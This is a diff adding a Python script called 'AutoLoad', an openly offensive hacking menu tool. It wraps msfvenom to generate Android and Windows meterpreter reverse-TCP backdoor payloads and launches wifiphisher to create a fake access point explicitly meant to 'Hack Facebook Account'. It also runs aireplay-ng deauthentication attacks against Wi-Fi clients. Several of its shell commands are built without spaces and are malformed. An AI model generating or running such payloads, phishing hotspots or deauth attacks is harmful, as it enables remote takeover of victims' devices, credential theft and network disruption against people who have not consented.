@@ -1,0 +1,225 @@
+#!/usr/bin/env python
+from __future__ import print_function
+from IPython.display import clear_output
+import colorama
+from colorama import Fore
+import os
+import sys
+import pygeoip
+import requests
+import httplib
+import socket
+clear_output()
+os.system('clear')
+print(Fore.GREEN +"                    Welcome to                   |::::::Follow Me on::::::")
+print(Fore.GREEN +"     _         _        _     ___            _   |                      ") 
+print(Fore.GREEN +"    / \  _   _| |_ ___ | |   / _ \  __ _  __| |  |YouTube:  https://www.youtube.com/Majorhacker")
+print(Fore.GREEN +"   / _ \| | | | __/ _ \| |  | | | |/ _` |/ _` |  |Website:  http://majorhacke.blogspot.com/    ")
+print(Fore.GREEN +"  / ___ \ |_| | || (_) | |__| |_| | (_| | (_| |  |Facebook: http://facebook.com/majorhacke     ")
+print(Fore.GREEN +" /_/   \_\__,_|\__\___/|_____\___/ \__,_|\__,_|  |                      ")
+print(Fore.GREEN +"            Automatic Your Proccess              |")
+print(Fore.GREEN +"                   created by Nafis              |")
+
+#----------------------------------------------------------------
+def check_internet():
+    test_con="www.google.com"
+    test_res="/intl/en/policies/privacy/"
+    test=httplib.HTTPConnection(test_con)
+    try:
+        test.request("GET",test_res)
+        response=test.getresponse()
+    except httplib.ResponseNotReady as e:
+        print("Improper Connection State")
+    except socket.gaierror as e:
+        print("Not Connected to the Internet")
+        print("Internet Required")
+        user_input=raw_input("Press Any key to Go back...")
+        import Autoload
+    else:
+        print(Fore.GREEN +"Connected")
+        
+#------------------------------------------------------------------
+def android():
+    os.system('clear')
+    print("::::::Create Payload For Android::::::")
+    print("")
+    print("Enter the IP and PORT you want to Listen on ")
+    ip=raw_input("IP: ")
+    port=raw_input("PORT: ")
+    name=raw_input("Name of the File: ")
+    path=raw_input("File Save to[add '/' in the end]: ")
+    print("Payload is going to Saved in " +path+name+ ".apk")
+    print("Generating...........")
+    os.system('msfvenom -p android/meterpreter/reverse_tcp --platform android LHOST=' +ip+ ' LPORT=' +port+ ' -o'+path+name+ '.apk')
+    print("")
+    print("Done..")
+    os.system('clear')
+    import Autoload
+#-------------------------------------------------------------------
+def windows():
+    os.system('clear')
+    print("::::::Create Payload For Windows::::::")
+    print("")
+    print("Enter the IP and PORT you want to Listen on ")
+    print("")
+    ip=raw_input("IP: ")
+    port=raw_input("PORT: ")
+    name=raw_input("Name of the File: ")
+    path=raw_input("File Save to[add '/' in the end]: ")
+    print("Payload is going to Saved in " +path+name+ ".exe")
+    print("Generating...........")
+    os.system('msfvenom -p windows/meterpreter/reverse_tcp --platform windows LHOST=' +ip+ ' LPORT=' +port+ ' -o' +path+name+'.exe')
+    print("")
+    print("Done..")
+    os.system('clear')
+    import Autoload
+#--------------------------------------------------------------------------------
+def helppp():
+    os.system('clear')
+    print("")
+    print("[..Example..]")
+    print("")
+    print("IP: 192.168.43.1")
+    print("PORT: 4444")
+    print("Name of the File: payload")
+    print("File Save to[add '/' in the end]: /root/payload/")
+    print("")
+    user_input=raw_input("Press Any key to Go back...")
+    os.system('clear')
+    import Autoload
+#--------------------------------------------------------------------------------------
+def fakeap():
+    os.system('clear')
+    print("::::::Create a Fake AP to Hack Facebook Account::::::")
+    print("")
+    ap=raw_input("Enter the name of the AP: ")
+    os.system('xterm -e wifiphisher  --essid' +ap+ '-p oauth-login; exec bash')
+    print("Creating............")
+    print("Done..")
+    os.system('clear')
+    import Autoload
+#------------------A--------------------------------------------------------------------
+def deauth():
+    os.system('clear')
+    def single():
+        apmac=raw_input("Enter the AP Essid(MAC): ")
+        cmac=raw_input("Enter the Client's MAC: ")
+        wificard=raw_input("Name of the WiFi card name in moniter mode: ")
+        os.system('xterm -e aireplay-ng --deauth -a' +apmac+ '-c' +cmac+ wificard)
+    def allcl():
+        apmac=raw_input("Enter the AP Essid(MAC): ")
+        wificard=raw_input("Name of the WiFi card name in moniter mode: ")
+        os.system('xterm -e aireplay-ng --deauth -a' +apmac+ wificard)   
+    print(":::::: Disconnect Client From there AP ::::::")
+    print("")
+    print("1.) Disconnect Single Client[Effective/Recommanded]")
+    print("2.) Disconnect All Client[Less Effective]")
+    print("3.) Scan ")
+    print("4.) Enable Moniter Mode")
+    print("5.) Disable Moniter Mode")
+    print("6.) Back")
+    print("")
+    user=input(Fore.BLUE +"Enter Your Choice: ")
+    if user == 1:
+        single()
+    elif user == 2:
+        allcl()
+    elif user == 3:
+        os.system('clear')
+        os.system('xterm -e airodump-ng wlan0mon &')
+        deauth()
+    elif user == 4:
+        os.system('airmon-ng start wlan0')
+        print("Done..")
+        deauth()
+    elif user == 5:
+        os.system('airmon-ng stop wlan0mon')
+        print("Done..")
+        deauth()
+    elif user == 6:
+        os.system('clear')
+        import Autoload
+    else:
+       print("Wrong Choice")
+#---------------------------------------------------------------------------------------------------
+def geolocate():
+    os.system('clear')
+    check_internet()
+    print("::::::GeoLocate An IP Address::::::")
+    print("")
+    x = raw_input('Input IP : ')
+    gip = pygeoip.GeoIP('/usr/local/bin/GeoLiteCity.dat')
+    rec = gip.record_by_addr(x)
+    for val in rec.items():
+        print ("%s: %s" %(val))
+        print("")
+    user_input=raw_input("Press Any key to Go back...")
+    os.system('clear')
+    import Autoload
+#-----------------------------------------------------------------------------------------------------------    
+def check_ip():
+    os.system('clear')
+    check_internet()
+    print("Please wait....")
+    print("Your Public IP is: ")
+    public_ip=os.system('curl -s ipinfo.io/ip')
+    print("")
+    user_input=raw_input("Press Any key to Go back...")
+    import Autoload
+#--------------------------------------------------------------------------------------------------------------    
+        
+print("")
+print("1.) Make a Android Payload    5.) Create Fake AP ")
+print("2.) Make a Windows Payload    6.) Deauth Attack  ")
+print("3.) Help                      7.) GeoLocate an IP")
+print("4.) Exit                      8.) View Public IP ")
+print("")
+while True:
+    user=input(Fore.BLUE +"Enter Your Choice: ")
+    if user == 1:
+        android()
+    elif user == 2:
+        windows()
+    elif user == 3:
+        helppp()
+    elif user == 4:
+        print("")
+        print("Thanks for using AutoLOad")
+        print("Goodbye!!")
+        print(Fore.RED +"Don't Forget to Subscribe my YouTube Channel..")
+        print("")
+        sys.exit()
+    elif user == 5:
+        fakeap()
+    elif user == 6:
+        deauth()
+    elif user == 7:
+        geolocate()
+    elif user == 8:
+        check_ip()
+    else:
+        print(Fore.RED +"Wrong Choice")
+
+print("")
+print("")
+print("")
+print ("You want to Continue....")
+print ("1.YES")
+print ("2.NO")
+while True:
+    user =input('Enter 1 or 2: ')
+    if user == 1:
+        import Autoload
+    elif user == 2:
+        print("Thanks for using AutoLOad")
+        print("Goodbye!!")
+        sys.exit()
+    else:
+        print (Fore.RED +"Wrong Choice")
+    continue
+
+
+
+
+    
+                                              
